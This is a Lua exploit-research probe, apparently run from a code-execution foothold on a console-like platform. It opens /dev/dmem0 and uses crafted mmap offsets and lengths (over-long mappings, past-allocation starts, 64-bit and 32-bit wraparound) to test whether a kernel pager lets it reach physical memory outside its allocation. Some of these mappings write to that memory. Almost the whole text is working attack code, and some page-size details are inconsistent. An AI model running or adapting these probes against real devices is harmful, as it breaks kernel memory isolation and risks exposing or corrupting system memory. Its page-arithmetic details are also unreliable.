-- CRASH_CLASS: HIGH
-- PROBE 802a: does the dmem0 pager validate the whole mapping, or only its first page?
--
-- The merged phase30 result (Finding 96, PR #158) maps GPU direct memory through
-- `/dev/dmem0` + mmap(477) and states that system RAM is unreachable because the offset is
-- unsigned and the pager "verifies allocation ownership". That claim is about a check on the
-- offset. It says nothing about a mapping that starts inside our allocation and extends past
-- it, nor about an offset that wraps in the page-index arithmetic.
--
-- A /dev/dmem0 mapping is a set of PFN mappings: for a mapping of length L at offset P the pager
-- resolves P + i*0x1000 for each page i. If the bounds test happens once, on P and L, or if the
-- addition is done in a narrow register, one of these cases maps memory outside the allocation:
--   B: length two pages with the allocation one page short of that
--   C: start physical address one page past the allocation
--   D: offset such that offset + page index wraps past 2^64
--   E: offset such that a 32-bit addition of the page index wraps to a small physical address
--   F: the system-owned head of the pool, which the merged result says returns 0x80020023
--
-- B and C write (the memory should be GPU pool). D, E and F are read-only: a wrong guess there
-- would be writing machine memory, and a read is enough to answer the question.

print("=== PROBE 802a: DMEM0 OFFSET AND LENGTH BOUNDS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return nil
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function split(h, l) return uint64(string.format("0x%X%08X", h, l)) end

local function show(label, rv)
    local n = to_num(rv)
    if n < 0 then n = n + 0x100000000 end
    print(string.format("  %s rv=0x%X", label, n))
    return n
end

if not libkernel_base then print("no libkernel_base"); return end

local alloc_fn = libkernel_base + uint64(0x17EF0)
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
print("[0] alloc ok=" .. tostring(ok_a) .. " rv=" .. tostring(to_num(arv)))
local ph = rq(phys_out)
local phlo = to_num(ph)
print("[0] phys=0x" .. string.format("%X", phlo))
if phlo == 0 then print("  no allocation, stopping"); return end

local sc_open = make_syscall(5)
local sc_mmap = make_syscall(477)
local path = memory.alloc(16)
for i = 0, 12 do pcall(function() memory.write_byte(path + i, 0) end) end
local name = "/dev/dmem0"
for i = 1, #name do pcall(function() memory.write_byte(path + i - 1, name:byte(i)) end) end
local ok_o, fd_rv = pcall(function() return sc_open(uint64(path), uint64(2), uint64(0)) end)
local fd = to_num(fd_rv)
print("[1] open ret=" .. fd)
if fd < 0 then print("  open failed, stopping"); return end

local PROT = uint64(0x33)
local FLAGS = uint64(0x11)          -- MAP_SHARED | MAP_FIXED

local function mmap_at(va, len, off)
    local ok, rv = pcall(function()
        return sc_mmap(uint64(va), uint64(len), PROT, FLAGS, uint64(fd), off)
    end)
    if not ok then return -999 end
    return to_num(rv)
end

print("")
print("[A] control: one page at our allocation")
local a = mmap_at(0x880000000, 0x4000, ph)
show("A", a)
print("  write=" .. tostring(wd(0x880000000, 0x1234ABCD)) ..
      " read=" .. string.format("%08X", rd(0x880000000) or 0))

print("")
print("[B] two pages from the same start (allocation is one page)")
local b = mmap_at(0x882000000, 0x8000, ph)
show("B", b)
if b ~= 0xFFFFFFFF and b ~= 0 then
    print("  page0=" .. string.format("%08X", rd(0x882000000) or 0))
    print("  page1=" .. string.format("%08X", rd(0x882004000) or 0))
end

print("")
print("[C] one page starting past the allocation")
local c = mmap_at(0x884000000, 0x4000, split(0, phlo + 0x1000))
show("C", c)
if c ~= 0xFFFFFFFF and c ~= 0 then
    print("  read=" .. string.format("%08X", rd(0x884000000) or 0))
    print("  write=" .. tostring(wd(0x884000000, 0xFEEDFACE)))
    print("  read back=" .. string.format("%08X", rd(0x884000000) or 0))
end

print("")
print("[D] offset that wraps past 2^64 at page 1 (read only)")
local d = mmap_at(0x886000000, 0x4000, split(0xFFFFFFFF, 0xFFFFE000))
show("D", d)
if d ~= 0xFFFFFFFF and d ~= 0 then
    print("  read=" .. string.format("%08X", rd(0x886000000) or 0))
end

print("")
print("[E] offset that wraps a 32-bit page-index addition (read only)")
local e = mmap_at(0x888000000, 0x4000, split(0, 0xFFFFFFF000))
show("E", e)
if e ~= 0xFFFFFFFF and e ~= 0 then
    print("  read=" .. string.format("%08X", rd(0x888000000) or 0))
end

print("")
print("[F] the system-owned head of the pool (read only)")
local f = mmap_at(0x88A000000, 0x4000, split(0, 0x100000000))
show("F", f)
if f ~= 0xFFFFFFFF and f ~= 0 then
    print("  read=" .. string.format("%08X", rd(0x88A000000) or 0))
end

print("")
print("[G] alive pid=" .. to_num(syscall.getpid()))
